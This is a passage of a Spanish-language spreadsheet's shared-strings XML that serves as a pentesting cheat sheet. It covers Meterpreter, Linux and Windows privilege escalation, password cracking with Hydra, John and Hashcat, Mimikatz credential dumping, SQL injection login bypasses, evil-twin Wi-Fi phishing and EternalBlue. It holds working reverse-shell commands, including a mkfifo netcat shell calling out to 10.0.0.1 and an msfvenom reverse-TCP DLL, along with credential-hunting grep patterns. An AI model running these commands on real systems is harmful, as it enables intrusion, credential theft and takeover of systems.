    <t>Intenta conseguir privilegios de admin, lo intenta por 3 vias diferentes</t>
  </si>
  <si>
    <t>getprivs</t>
  </si>
  <si>
    <t>Nos muestra si tenemos privilegios para hacer una escalada de privilegios</t>
  </si>
  <si>
    <t>clearev</t>
  </si>
  <si>
    <t>Nos muestra los privilegios habilitados que tiene el proceso actual</t>
  </si>
  <si>
    <t>Borra todos los registros de eventos que tiene el sistema</t>
  </si>
  <si>
    <t>Un poco cantoso ya que borra todos los eventos, no solamente los relacionados con la intrusion</t>
  </si>
  <si>
    <t>download / upload</t>
  </si>
  <si>
    <t>Para descargar o cargar cosas a traves de meterpreter</t>
  </si>
  <si>
    <t>migrate "ID Proceso"</t>
  </si>
  <si>
    <t>Nos migra a un proceso que proporcionemos</t>
  </si>
  <si>
    <t>Lo ideal es migrar a un proceso estable</t>
  </si>
  <si>
    <t>ps</t>
  </si>
  <si>
    <t>Vemos los procesos en ejecucion con su ID</t>
  </si>
  <si>
    <t>search</t>
  </si>
  <si>
    <t>Nos permite buscar recursos en la maquina victima</t>
  </si>
  <si>
    <t>shell</t>
  </si>
  <si>
    <t>Nos abre una shell estandar</t>
  </si>
  <si>
    <t>Advanced show options pero con mas opciones</t>
  </si>
  <si>
    <t>Le carga una rutina remota de vncinject</t>
  </si>
  <si>
    <t>Genera binarios con payload para conexión, se pueden incluir los badchar</t>
  </si>
  <si>
    <t>Meterlo en exploits nos permite pasar la conexión de un payload a base64 como meterpreter</t>
  </si>
  <si>
    <t>Para cargarle un VNC  y ver lo que hace el usuario</t>
  </si>
  <si>
    <t>Para ver el estado del firewall</t>
  </si>
  <si>
    <t>Parchear inicio de windows-mac para acceder sin saber la contraseña</t>
  </si>
  <si>
    <t>Borramos toda la linea y ponemos rw i\initd=/bin/bash y guardamos, al iniciar nos iniciara una shell con root, y se puede usar passwd siendo root para cambiar la contraseña</t>
  </si>
  <si>
    <t>Atacamos la SAM con windows apagado y añadimos un usuario administrador con contraseña vacia desde linux</t>
  </si>
  <si>
    <t>Sustitucion de archivos binario de accesibilidad en windows, para arrancar cmd y cambiar contraseña</t>
  </si>
  <si>
    <t xml:space="preserve">No puede autenticar sistemas en RED </t>
  </si>
  <si>
    <t xml:space="preserve">Para bypass listas negras de root, cambiando la variable home por la de root </t>
  </si>
  <si>
    <t>Crea un link simbolico en index.html</t>
  </si>
  <si>
    <t>Permite incrustar la bandera de root en index</t>
  </si>
  <si>
    <t>Si en un panel de login usa la funcion strcmp (stringcompare) para comparar la password con algo ya definido y usamos un array [] nos podemos saltar el loggin</t>
  </si>
  <si>
    <t>Comprobar permisos</t>
  </si>
  <si>
    <t>Sacar credenciales en memoria</t>
  </si>
  <si>
    <t>Ver si tiene los permisos necesarios para ejecutarse</t>
  </si>
  <si>
    <t>PsExec</t>
  </si>
  <si>
    <t>Ejecuta programas de forma remota</t>
  </si>
  <si>
    <t>Para que funcione se necesita un usario y contraseña. Que esté habilitado el recurso compartido IPC$ y ADMIN$, e Iniciado los servicios Netlogon</t>
  </si>
  <si>
    <t>Si lo que queremos es abrir una consola de comandos en un equipo remoto, ejecutamos lo siguiente</t>
  </si>
  <si>
    <t>psexec -h -s -accepteula \\IP_EquipoRemoto o Nombre -u nombreUsuario -p password cmd.exe</t>
  </si>
  <si>
    <r>
      <t>Para ver los recursos compartidos podemos ejecutar el comando: </t>
    </r>
    <r>
      <rPr>
        <i/>
        <sz val="8"/>
        <color rgb="FF666666"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Net share</t>
    </r>
  </si>
  <si>
    <t>psExec desde metasploit</t>
  </si>
  <si>
    <t>poner -s en PsExec si no para intentar ejecutarlo como administrador -c le carga el mimikatz</t>
  </si>
  <si>
    <t>Herramienta para la administracion de equipos en RED</t>
  </si>
  <si>
    <t>PDQ Inventory</t>
  </si>
  <si>
    <t>Explora sus equipos y recopila el hardware, software y configuraciones de Windows. Además, PDQ Inventory le permite ejecutar informes de inventario de escaneo, máquinas de arranque desde Wake-On LAN, ejecutar comandos y escritorio remoto en máquinas de destino y muchas otras características. https://www.pdq.com/tools-library</t>
  </si>
  <si>
    <t>Escalar a administrador en meterpreter</t>
  </si>
  <si>
    <t>Para abrir una shell como administrador</t>
  </si>
  <si>
    <t>Puede tarda bastante rato y tarda en funcionar</t>
  </si>
  <si>
    <t>Para salir de una propt limitada</t>
  </si>
  <si>
    <t>Funciona muy bien en algunas versiones W10 esta parcheado</t>
  </si>
  <si>
    <t>Ej: elevate ms14-058 smb</t>
  </si>
  <si>
    <t>Con chown nos podemos hacer propietarios de root</t>
  </si>
  <si>
    <t>O darnos privilegios con chmod, poniendo antes sudo chown sudo chmod</t>
  </si>
  <si>
    <t>Linux Smart Enumeration Para que nos saque las cosas importantes y ver si podemos escalar</t>
  </si>
  <si>
    <t>Si se tiene permiso de escritura en /etc/passwd --&gt; openssl passwd "contraseña" se puede sustituir la root:x:0 sustituir la x por el hash y despues al hacer "su root" y poner la contraseña</t>
  </si>
  <si>
    <t>/etc/passwd con permisos de escritura seremos root --&gt;</t>
  </si>
  <si>
    <t>Crear un archivo en /tmp llamado update y se ejecutara con root</t>
  </si>
  <si>
    <t>Directorio report chkrootkit. Si vemos un directorio llamado report en alguna maquina es una vulnerabilidad de chkrootkit y nos permite escalar privilegios</t>
  </si>
  <si>
    <t>Si al conectarnos por ssh al final ponemos bash nos dara una shell normal</t>
  </si>
  <si>
    <t>Buscar si no "rbash pentesting" para otras formas de evasion o elevacion de priv</t>
  </si>
  <si>
    <t>Nos muestra los parches que faltan de la categoria que le pasemos</t>
  </si>
  <si>
    <t>Hay que hacer un system.info en la maquina windows para pasarselo como parametro</t>
  </si>
  <si>
    <t>Como un root sin contraseña un sudo con roles</t>
  </si>
  <si>
    <t>Wget descargar recurso en otra maquina</t>
  </si>
  <si>
    <t>Hace falta tener un servidor levantado.</t>
  </si>
  <si>
    <t>Para crear una password en DES y meterla en el ect/passwd</t>
  </si>
  <si>
    <t>Se necesitan permisos de escritura en /etc/passwd</t>
  </si>
  <si>
    <t>Elevacion de privilegios de un servicio windows</t>
  </si>
  <si>
    <t>Impersona un servicio de Windows con privilegios admin NT SYSTEM</t>
  </si>
  <si>
    <t>Busca programas y registros elevacion con autoprivilege y firmados por microsoft</t>
  </si>
  <si>
    <t>Programas debiles que hacen llamadas buscando dll para elevar privilegios</t>
  </si>
  <si>
    <t>Comprobar el permiso</t>
  </si>
  <si>
    <t>Bit SUID este permiso nos permite ejecutar ficheros como si fueramos su propietario, normalmente root</t>
  </si>
  <si>
    <t>find /bin -perm -4000</t>
  </si>
  <si>
    <t>Mejor que LinEnum, se puede usar -1 -2 para el nivel de profundidad</t>
  </si>
  <si>
    <t>Tambien se puede hacer con python -c 'import crypt; print crypt.crypt("1234", "salted")'</t>
  </si>
  <si>
    <t>Hydra para que sepa cuando no hace un loggin exitoso hay que poner algo que salga cuando no es correcto</t>
  </si>
  <si>
    <t>Para convertir lo que sea a formato john y que lo entienda</t>
  </si>
  <si>
    <t>Uso de Hydra en un formulario post con usuario admin</t>
  </si>
  <si>
    <t>Cracking zip</t>
  </si>
  <si>
    <t>Crackeo de cuentas windows sin tener privilegios y sin bloquearlas</t>
  </si>
  <si>
    <t>A la hora de definir la string de intento erroneo o incorrecto</t>
  </si>
  <si>
    <t>Patator si tiene alguna esclamacion escaparla con Password\!</t>
  </si>
  <si>
    <t>Cracking con Medusa</t>
  </si>
  <si>
    <t>Permite aceleracion CUDA</t>
  </si>
  <si>
    <t>Para hacer un benchmark de un modulo especifico</t>
  </si>
  <si>
    <t>Lista de modulos para atacar</t>
  </si>
  <si>
    <t>La lista numerica de -m "numero" del tipo de hash a atacar</t>
  </si>
  <si>
    <t>-w 4 Es el modo Insano, Pesadilla, Locura, es el mas rapido, pero da bastante lag</t>
  </si>
  <si>
    <t>Para Hashcat hay que quitar la cabecera que nos da el 2john</t>
  </si>
  <si>
    <t>Interfaz grafica web</t>
  </si>
  <si>
    <t>Interfaz grafica web con python</t>
  </si>
  <si>
    <t>Para hacer ataques distribuidos con varias maquinas Hashcat</t>
  </si>
  <si>
    <t>John ahora soporta cuda</t>
  </si>
  <si>
    <t>Crackea un hash con diccionario</t>
  </si>
  <si>
    <t>Crackea un hash con formato NT con diccionario</t>
  </si>
  <si>
    <t>Si se le quita la cabecera sirve para Hashcat</t>
  </si>
  <si>
    <t>Nos muestra la contraseñas desencriptadas de ese archivo</t>
  </si>
  <si>
    <t>john --show hashes.txt</t>
  </si>
  <si>
    <t>Interfaz gráfica de John</t>
  </si>
  <si>
    <t>johnny</t>
  </si>
  <si>
    <t>Copia de NTDS.DIT y copia de seccion de registro de system</t>
  </si>
  <si>
    <t>Para levantarnos un recurso compartido en red Samba en la direccion en la que estemos</t>
  </si>
  <si>
    <t>En W10 nos puede dar problemas de version añadir -smb2support</t>
  </si>
  <si>
    <t>Obtener domain admin</t>
  </si>
  <si>
    <t>Boton gordo, usa empire por debajo para funcionar</t>
  </si>
  <si>
    <t>Empire es un software de explotacion como metasploit y meterpreter que usa powershell para realizar las cosas y comunicarse cifradamente</t>
  </si>
  <si>
    <t>Dumpeo de la SAM</t>
  </si>
  <si>
    <t>Hacer y bypass the hash y abrir un cmd</t>
  </si>
  <si>
    <t xml:space="preserve">Shell en Bash </t>
  </si>
  <si>
    <t>nc -lvvp 8080 La IP del atacante es la 8.8.8.8</t>
  </si>
  <si>
    <t>Shell en Perl</t>
  </si>
  <si>
    <t>Shell en Python</t>
  </si>
  <si>
    <t>Shell en PHP</t>
  </si>
  <si>
    <t>Shell en Ruby</t>
  </si>
  <si>
    <t>Shell con Netcat</t>
  </si>
  <si>
    <t>Shell en perl de forma directa</t>
  </si>
  <si>
    <t>Cuando el usuario tiene permisos de root para ejecutar perl</t>
  </si>
  <si>
    <t>Para salir de una propmt limitada</t>
  </si>
  <si>
    <t>Para descargar en un servidor una shell reversa y ejecutarla en php</t>
  </si>
  <si>
    <t>Para cargar una shell en txt y que se interprete el contenido en php</t>
  </si>
  <si>
    <t>No aloja fichero malicioso en la maquina</t>
  </si>
  <si>
    <t>Tenemos que invocar un bash que invoque el otro bash</t>
  </si>
  <si>
    <t>Para llamar a una shell reversa en SSH teniendo las claves</t>
  </si>
  <si>
    <t>Webshell reversa PHP por defecto Kali</t>
  </si>
  <si>
    <t>Si nos falla al crear una Webshell u otra cosa invocando bash</t>
  </si>
  <si>
    <t>Para crear un nuevo recurso de red con permisos</t>
  </si>
  <si>
    <t>Añadir usuario al grupo de registro que pueden usar rdp</t>
  </si>
  <si>
    <t>Nos dice si el puerto esta abierto y a la escucha</t>
  </si>
  <si>
    <t xml:space="preserve">Ver las propiedades de la cuenta </t>
  </si>
  <si>
    <t xml:space="preserve">net user usuario </t>
  </si>
  <si>
    <t>Para listar los usuarios que pertenecen a un grupo</t>
  </si>
  <si>
    <t>Guardar una copia de SYSTEM</t>
  </si>
  <si>
    <t>Pipes Eternal. Si al comprobar el EternalBlue nos dice que algun pipe es permitido podemos usar el pipe permitido y cargar una shell</t>
  </si>
  <si>
    <t>python eternalblue_exploit7.py 172.20.0.103 sc_all.bin</t>
  </si>
  <si>
    <t>Autoblue</t>
  </si>
  <si>
    <t>Pasos a seguir: cd shellcode --&gt; ./shell_prep.sh --&gt; mv sc_all.bin ..</t>
  </si>
  <si>
    <t>lxd.sh Si estamos en el grupo lxd (son ubuntus sin entorno grafico podemos intentar explotar una vulnerabilidad en lxd)</t>
  </si>
  <si>
    <t>lxd.sh Si se va a explotar lxd.sh a parte de buildear la imagen Alpine</t>
  </si>
  <si>
    <t>Tenemos que pasar el script a formato linux con dos2unix lxd.sh</t>
  </si>
  <si>
    <t xml:space="preserve"> Shell Netcat a traves de codigo PHP en una conexión SSH</t>
  </si>
  <si>
    <t>conexión Netcat a la escucha</t>
  </si>
  <si>
    <t>Usar commit antiguo github los nuevos se cargaron la aplicación</t>
  </si>
  <si>
    <t>Con Mimikatz cargamos el dump sekurlsa::ninidump "nombre dump" y luego sekurlsa::logonpasswords</t>
  </si>
  <si>
    <t>MONTAR / LEVANTAR SERVIDORES</t>
  </si>
  <si>
    <t>Para elegir la ruta donde se monta</t>
  </si>
  <si>
    <t>Ver los detalles de los campos, eliminar el tamaño maximo de los campos</t>
  </si>
  <si>
    <t>Podemos cambiar la cookie dandole a Save</t>
  </si>
  <si>
    <t>Para mostrar elementos ocultos</t>
  </si>
  <si>
    <t>Para ver las vulnerabilidades encontradas</t>
  </si>
  <si>
    <t>Si aparece una hoja es una pagina en blanco, con engranaje tiene parametros</t>
  </si>
  <si>
    <t>Mandar la peticion al intruder</t>
  </si>
  <si>
    <t>Mandar la peticion al repeater</t>
  </si>
  <si>
    <t>cambiar el User-Agent por &lt;?phpinfo();?&gt;</t>
  </si>
  <si>
    <t>Para ver si se puede cargar php en el User-Agent</t>
  </si>
  <si>
    <t>Todos los paquetes mandados desde la ip</t>
  </si>
  <si>
    <t>Todos los paquetes IP mandados desde esa ip</t>
  </si>
  <si>
    <t>Paquetes con el destino IP</t>
  </si>
  <si>
    <t>Para ver las comunicaciones entre los equipos</t>
  </si>
  <si>
    <t>Interceptar el trafico de todo el mundo en la red, nos muestra solo lo interesante, como logins en http</t>
  </si>
  <si>
    <t>Fuerza a que las comunicaciones vayan por http en vez de por https, aunque se le diga que vaya por https, hace un ssl strip</t>
  </si>
  <si>
    <t>Activar el Sniffer el APR decir sobre que queremos interceptar la comunicacion y darle, despues ir a password</t>
  </si>
  <si>
    <t>Para reenviar los paquetes</t>
  </si>
  <si>
    <t>Explotacion shellshock</t>
  </si>
  <si>
    <t>Usar Dirbuster con el proxy de Burp Suite para que todo lo que encuentre con el fuzzing lo pinte en Burp</t>
  </si>
  <si>
    <t>Si dejamos el spider activado cuando Burp encuentre algo se metera a investigar lo que hay dentro lanzando el spider.</t>
  </si>
  <si>
    <t>wpscan tiene para detectar xmlrpc</t>
  </si>
  <si>
    <t>Si esta activado podria permite ejecutar codigo remoto</t>
  </si>
  <si>
    <t>Ejemplo de uso</t>
  </si>
  <si>
    <t>Activar el modo recursivo de directorios</t>
  </si>
  <si>
    <t xml:space="preserve">Escaneo con doble fuzzing </t>
  </si>
  <si>
    <t>Para escanear puertos internos en una peticion SSRF de un servidor web</t>
  </si>
  <si>
    <t>Shell en php</t>
  </si>
  <si>
    <t>Para que no compruebe el certificado</t>
  </si>
  <si>
    <t>Para los errores de los certificados</t>
  </si>
  <si>
    <t>Para descargar cosas desde la terminal de windows</t>
  </si>
  <si>
    <t>Reverse shell para Tomcat</t>
  </si>
  <si>
    <t>Appearance --&gt; editor --&gt; plantilla 404 --&gt; cargamos codigo PHP malicioso y para invocarlo url de la maquina ?=404.php</t>
  </si>
  <si>
    <t>Cargar servidor Apache en Kali</t>
  </si>
  <si>
    <t>Carga servidor con Python3</t>
  </si>
  <si>
    <t>Montar un FTP en Python</t>
  </si>
  <si>
    <t>Levantar servidor con PHP</t>
  </si>
  <si>
    <t>Como escaner de vulnerabilidades, inyecciones SQL</t>
  </si>
  <si>
    <t>Target--&gt;Site map</t>
  </si>
  <si>
    <t>Pestaña Target/Site map. Si aparece en gris es que no le hemos vistado, en negro visitado</t>
  </si>
  <si>
    <t>Para decodificar URL por ejemplo cuando vamos a hacer una peticion de intruder para sacar una contraseña y nos muestra caracteres extraños</t>
  </si>
  <si>
    <t>Pestaña Extender. Para añadir pluggins de 3º</t>
  </si>
  <si>
    <t>Pestaña Dashboard/Alerts (solo version PRO). Para ver las vulnerabilidades encontradas</t>
  </si>
  <si>
    <t>Certificado Burp</t>
  </si>
  <si>
    <t>Proxy/Options/CA Certificate</t>
  </si>
  <si>
    <t>Importar certificado de Burp en el navegador para que no muestre alertas</t>
  </si>
  <si>
    <t>Para atacar la URL automaticamente y encontrar vulnerabilidades</t>
  </si>
  <si>
    <t>Visualiza el trafico origen y destino de la pagina. Visualiza los paquetes que contienen la pagina en el contenido en protocolo http.</t>
  </si>
  <si>
    <t>Para ver todo el tráfico que entra y sale de una máquina con dirección mac</t>
  </si>
  <si>
    <t>para mostrar sólo los paquetes que contienen el puerto de origen o destino TCP 80</t>
  </si>
  <si>
    <t>para mostrar sólo los paquetes que contienen el puerto de origenTCP 80</t>
  </si>
  <si>
    <t>Que la pagina web contenga la palabra "pass"</t>
  </si>
  <si>
    <t>eth.addr == "MAC"</t>
  </si>
  <si>
    <t>Mini ISO Tiny Core para practicar ShellShock</t>
  </si>
  <si>
    <t xml:space="preserve">Ejemplo de ShellShock en el useragent con shell reversa  </t>
  </si>
  <si>
    <t>No comprueba el certificado SSL</t>
  </si>
  <si>
    <t>wpscan --url http://10.10.10.10:80/webservices/wp -e ap --plugins-detection mixed</t>
  </si>
  <si>
    <t>https://github.com/epinna/weevely3</t>
  </si>
  <si>
    <t>Cambiar el User-Agent por uno que no exista para bypass listas negras o uno que no este en la lista negra</t>
  </si>
  <si>
    <t>Cargar shell PHP en WordPress</t>
  </si>
  <si>
    <t>Cargar shell PHP en Drupal</t>
  </si>
  <si>
    <t xml:space="preserve">En Drupal modules --&gt; phpfilter &gt; enable &gt; save configuration add new articule </t>
  </si>
  <si>
    <t>Usando load_file en una de las columnas del union podemos ver password</t>
  </si>
  <si>
    <t>Para cargar archivos en sql</t>
  </si>
  <si>
    <t>Poder ejecutar comandos OS desde MySQL</t>
  </si>
  <si>
    <t>Bypass campo Login</t>
  </si>
  <si>
    <t>El + por /**/ como comentario lo traduce como espacio</t>
  </si>
  <si>
    <t>Usar anticomentarios, la BD lo comenta y lo descomenta</t>
  </si>
  <si>
    <t>Se puede convertir users en codificacion char</t>
  </si>
  <si>
    <t>En URL Encode si da error se pueden sustituir los espacios por +</t>
  </si>
  <si>
    <t>En MYSQL se pueden quitar los espacios o los +, y cogeria la consulta sin espacios</t>
  </si>
  <si>
    <t>Para cargar las cabeceras de una peticion capturada</t>
  </si>
  <si>
    <t>Nivel de testeo usado, este es el maximo</t>
  </si>
  <si>
    <t>Lo mismo pero con el nivel de riesgo</t>
  </si>
  <si>
    <t>Nombre base de datos</t>
  </si>
  <si>
    <t>Para obtener una shell de sql</t>
  </si>
  <si>
    <t>Ver el tipo de base de datos</t>
  </si>
  <si>
    <t>Nombre de todas las tablas</t>
  </si>
  <si>
    <t>Nombre de todas las columnas</t>
  </si>
  <si>
    <t>Dumpeo de lo que especifiquemos en las opciones anteriores</t>
  </si>
  <si>
    <t>Dumpea todo</t>
  </si>
  <si>
    <t>Una shell de sistema operativo</t>
  </si>
  <si>
    <t>Con el -r se le deveria pasar la cookie de sesion</t>
  </si>
  <si>
    <t>Iniciar modo monitor</t>
  </si>
  <si>
    <t>Para hacer cracking wpe wpa automaticamente, nos pone la tarjeta en modo monitor</t>
  </si>
  <si>
    <t>Capturar contraseña wifi usando ingenieria social con falso AP y desaunteticacion</t>
  </si>
  <si>
    <t>Se pueden agregar plantillas para la ingenieria social</t>
  </si>
  <si>
    <t xml:space="preserve">Para mandar campañas de excel con macros </t>
  </si>
  <si>
    <t>Directorio que quieres borrar</t>
  </si>
  <si>
    <t>rm *</t>
  </si>
  <si>
    <t>Borrar todos los archivos de una carpeta, nos pide confirmacion por cada archivo</t>
  </si>
  <si>
    <t>RPC</t>
  </si>
  <si>
    <t>rpclient -U "" IP -N</t>
  </si>
  <si>
    <t>Para conectarnos con sesion nula sin proporcionar contraseña</t>
  </si>
  <si>
    <t>rpcclient -U "" 10.10.10.10 -c "enumdomusers" -N</t>
  </si>
  <si>
    <t>Enumerar usuarios del dominio</t>
  </si>
  <si>
    <t>Nos enumera los grupos del dominio</t>
  </si>
  <si>
    <t>rpcclient -U "" 10.10.10.10 -c "enumdomgroups" -N</t>
  </si>
  <si>
    <t>if [ ! -z $ip_address" ]</t>
  </si>
  <si>
    <t>Con -z es si esta vacia</t>
  </si>
  <si>
    <t>En bash si la variable no esta vacia</t>
  </si>
  <si>
    <t>cme smb 10.10.10.10 -u user.txt -p pass.txt</t>
  </si>
  <si>
    <t>Comprobar usuarios contra el smb se puede usar con listas</t>
  </si>
  <si>
    <t>cme smb 10.10.10.10 -u usuario -p contraseña</t>
  </si>
  <si>
    <t>Comprobar usuarios contra el smb</t>
  </si>
  <si>
    <t>curl -vX $TARGET</t>
  </si>
  <si>
    <t>BannerGrabing con Curl</t>
  </si>
  <si>
    <t>curl -s -I 192.168.1.106 | grep -e "Server: "</t>
  </si>
  <si>
    <t>Otra forma de hacer BannerGrabing</t>
  </si>
  <si>
    <t>nmap -Pn -p 80 -sV --script=banner 192.168.1.106</t>
  </si>
  <si>
    <t>nmap -sV --script=banner 192.168.1.106</t>
  </si>
  <si>
    <t>Sacar los Banner con Nmap</t>
  </si>
  <si>
    <t>nc -v 192.168.1.106 22</t>
  </si>
  <si>
    <t>Conectarnos a un puerto y BannerGrabing</t>
  </si>
  <si>
    <t>TELNET</t>
  </si>
  <si>
    <t>telnet 192.168.1.106 22</t>
  </si>
  <si>
    <t>BANNERGRABING</t>
  </si>
  <si>
    <t>-b para todos los puertos abiertos</t>
  </si>
  <si>
    <t>dmitry -b 192.168.1.106</t>
  </si>
  <si>
    <t>querygroup RID del grupo</t>
  </si>
  <si>
    <t>querygroupmen RID</t>
  </si>
  <si>
    <t>queryuser RID</t>
  </si>
  <si>
    <t>rpcclient -U "" 10.10.10.10 -c "enumdomusers" -N | grep -oP '\[.*?\]' | grep -v -E '0x|DefaultAccount|Guest' | sort -u | tr -d '[]' &gt; user.txt</t>
  </si>
  <si>
    <t>Nos muestra la informacion del grupo</t>
  </si>
  <si>
    <t>Tenemos que estar conectado por rpclient</t>
  </si>
  <si>
    <t>Tenemos que estar conectado por rpcclient</t>
  </si>
  <si>
    <t>Nos muestra otra lista de RID que corresponden a los usuarios miembros de ese grupo, nos muestra otro RID que es el que tienen los administradores de dominio</t>
  </si>
  <si>
    <t>Que nos da el grupo con el comando de arriba, nos muestra todo sobre ese usuario</t>
  </si>
  <si>
    <t>Nos saca una lista de todos los usuarios para usarlos como diccionario</t>
  </si>
  <si>
    <t>rpcenum</t>
  </si>
  <si>
    <t>Nuestro script que nos saca todo lo necesario que tenemos que saber</t>
  </si>
  <si>
    <t>pipenv</t>
  </si>
  <si>
    <t>Automáticamente crea entornos virtuales para tus proyectos, con diferentes versiones de librerias, diferentes paquetes</t>
  </si>
  <si>
    <t>https://platzi.com/tutoriales/1104-python/2292-pipenv-virtualenv-y-pip-en-un-solo-comando/</t>
  </si>
  <si>
    <t>Nos lista los recursos compartidos</t>
  </si>
  <si>
    <t>smbmap -H 10.10.10.10 -u usuario -p contraseña</t>
  </si>
  <si>
    <t>Ver lo que tiene compartido SMB con usuario y contraseña</t>
  </si>
  <si>
    <t>gem install evil-winrm</t>
  </si>
  <si>
    <t>WinRM shell para hacer pentesting</t>
  </si>
  <si>
    <t>Si tiene WinRM habilitado nos abre una powershell</t>
  </si>
  <si>
    <t>EVIL-WINRM</t>
  </si>
  <si>
    <t>evil-winrm -u 'usuario' -p 'contraseña' -i IP</t>
  </si>
  <si>
    <t>dir -Force</t>
  </si>
  <si>
    <t>Nos muestra mas directorios incluido los ocultos</t>
  </si>
  <si>
    <t>whoami /priv</t>
  </si>
  <si>
    <t>whoami /all</t>
  </si>
  <si>
    <t>Para mostrarnos todo como los grupos a los que estamos asignados</t>
  </si>
  <si>
    <t>Winrm servicio de administrador remoto de windows winrm esta activo 5985   Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</t>
  </si>
  <si>
    <t>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f dll &gt; privesc.dll</t>
  </si>
  <si>
    <t>dll Para escalar privilegios con una shell como para hacer "dns admin windows privilege escalation"</t>
  </si>
  <si>
    <t>DNS</t>
  </si>
  <si>
    <t>dnscmd /config /serverlevelplugindll \\10.10.10.10\smbFolder\privesc.dll</t>
  </si>
  <si>
    <t>nmap -sU --top-ports 1000 IP</t>
  </si>
  <si>
    <t>Los 1000 puertos mas comunes UDP</t>
  </si>
  <si>
    <t>Si se usa -sUV es mas preciso, pero tarda mas tiempo</t>
  </si>
  <si>
    <t>cme smb 10.10.10.10 -u usuario -p contraseña --shares</t>
  </si>
  <si>
    <t>BannerGrabing con Dmitry</t>
  </si>
  <si>
    <t>Para ver los privilegios que tenemos y ver si tenemos privilegios para escalar como impersonate privilege</t>
  </si>
  <si>
    <t>Para hacer un DNS Windows privilege escalation</t>
  </si>
  <si>
    <t>Si esta el puerto 5985 levantado nos abrira una powershell en la maquina</t>
  </si>
  <si>
    <t xml:space="preserve">find ./ -type f -name "*back*" -exec grep -riE "user|usuario|pass|contraseña|root|admin|creden" {} + </t>
  </si>
  <si>
    <t>find ./ -name "*back*" | grep -R -i -E "user|usuario|pass|contraseña|root|admin|creden" ./</t>
  </si>
  <si>
    <t>find ./ -type f -name "*conf*" -exec grep -riE "user|usuario|pass|contraseña|root|admin|creden" {} +</t>
  </si>
  <si>
    <t>find ./ -name "*conf*" | grep -R -i -E "user|usuario|pass|contraseña|root|admin|creden" ./</t>
  </si>
  <si>
    <t>grep -R -i -E "usuario|user|pass|password|contraseña|root|admin" ./</t>
  </si>
  <si>
    <t>Busca en los archivos de backup usuarios y contraseñas</t>
  </si>
  <si>
    <t>Busca en los archivos de configuracion usuarios y contraseñas</t>
  </si>
  <si>
    <t>Busca en todos los archivos usuarios y contraseñas de forma recursiva</t>
  </si>
  <si>
    <t>Busca en los todos los archivos de la ruta usuarios y contraseñas</t>
  </si>
  <si>
    <t>Busca en todos los archivos de la ruta usuarios y contraseñas</t>
  </si>
  <si>
    <t>apt-get install tree</t>
  </si>
  <si>
    <t>Instala tree que nos permite listar en formato arbol</t>
  </si>
  <si>
    <t>exrex</t>
  </si>
  <si>
    <t>Como Crunch</t>
  </si>
  <si>
    <t>Regular Expression, crea un diccionario con expresiones reguales o patrones</t>
  </si>
  <si>
    <t>smbclient -N -L //10.10.10.10</t>
  </si>
  <si>
    <t>N sesion nula   L obtener lista</t>
  </si>
  <si>
    <t>Conectarnos al smb</t>
  </si>
  <si>
    <t>nmap --script=smb-enum-shares.nse -p 10.10.10.10  -p 445</t>
  </si>
  <si>
    <t>Nos da una lista de la ruta de lo que tiene compartido</t>
  </si>
  <si>
    <t>Tambien se puede usar enum4linux</t>
  </si>
  <si>
    <t>nautilus smb://10.10.10.10</t>
  </si>
  <si>
    <t>Interfaz grafica de SMB en el explorador de archivos</t>
  </si>
  <si>
    <t>O poner smb://IP</t>
  </si>
  <si>
    <t>smbclient -N  //10.10.10.10/Directorio</t>
  </si>
  <si>
    <t>Para conectarnos por terminal</t>
  </si>
  <si>
    <t>smb get archivo</t>
  </si>
  <si>
    <t>smb put archivo</t>
  </si>
  <si>
    <t>Conectados por smb para descargarnos un archivo</t>
  </si>
  <si>
    <t>Conectados por smb para subir un archivo</t>
  </si>
  <si>
    <t>Tiene que estar conectado por terminal</t>
  </si>
  <si>
    <t>dig axfr dominio 10.10.10.10</t>
  </si>
  <si>
    <t>Enumerar subdominios DNS</t>
  </si>
  <si>
    <t>host -l dominio 10.10.10.10</t>
  </si>
  <si>
    <t>Hace una transferencia de zona</t>
  </si>
  <si>
    <t>for x in $(cat urls.txt); do echo http://$x &amp;&amp; echo https://$x; done</t>
  </si>
  <si>
    <t>Nos pone http y https a la lista de todos los dominios</t>
  </si>
  <si>
    <t>1 por linea</t>
  </si>
  <si>
    <t>DNS TCP 53</t>
  </si>
  <si>
    <t>Si DNS corre en tcp en el puerto 53 normalmente se usa para transferencias de zona</t>
  </si>
  <si>
    <t>Solamente se usa en tcp cuando el tamaño de la respuesta es superior a 512 bytes</t>
  </si>
  <si>
    <t>/etc/host 10.10.10.10 dominio</t>
  </si>
  <si>
    <t>Poner todos los subdominios que se encuentren</t>
  </si>
  <si>
    <t>Para poner todos los dominios se ponen en la misma linea dejando un espacio con el anterior</t>
  </si>
  <si>
    <t>smbmap -H 10.10.10.10 -r</t>
  </si>
  <si>
    <t>Nos lista de forma recursiva lo que hay en el directorio</t>
  </si>
  <si>
    <t>smbmap -H 10.10.10.10 --download directorio/archivo</t>
  </si>
  <si>
    <t>Nos descarga un archivo del directorio</t>
  </si>
  <si>
    <t>x argumentos se ejecuta una vez por cada agumento, sin argumentos lo compacta todo en la misma linea</t>
  </si>
  <si>
    <t>pwdx PID</t>
  </si>
  <si>
    <t>Nos dice en que ruta se esta ejecutando el proceso o servicio</t>
  </si>
  <si>
    <t>wfuzz --hl 0</t>
  </si>
  <si>
    <t xml:space="preserve">Nos oculta todas las respuestas que tengan 0 lineas 0 output </t>
  </si>
  <si>
    <t>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</t>
  </si>
  <si>
    <t>Shell Netcat que funciona en todas las versiones de Netcat</t>
  </si>
  <si>
    <t>string "archivo"</t>
  </si>
  <si>
    <t>highon.coffee</t>
  </si>
  <si>
    <t>Pagina web, como explotar, nos muestra como ver archivos internos de la maquina a traves de un LFI PHP en uno de los parametros</t>
  </si>
  <si>
    <t>PHP filter LFI wrapper</t>
  </si>
  <si>
    <t>https://0xsp.com/offensive/active-directory-attack-defense#top</t>
  </si>
  <si>
    <t>Como atacar y defendernos AD</t>
  </si>
  <si>
    <t>Incluye como hacer escaladas de privilegios, tecnicas de evasion, todo lo necesario</t>
  </si>
  <si>
    <t>https://lolbas-project.github.io/</t>
  </si>
  <si>
    <t>En base a un binario nos dice como podemos explotarlo en Windows</t>
  </si>
  <si>
    <t>Como explotar LoLBins https://blog.talosintelligence.com/2019/11/hunting-for-lolbins.html</t>
  </si>
  <si>
    <t>dllhijacking</t>
  </si>
  <si>
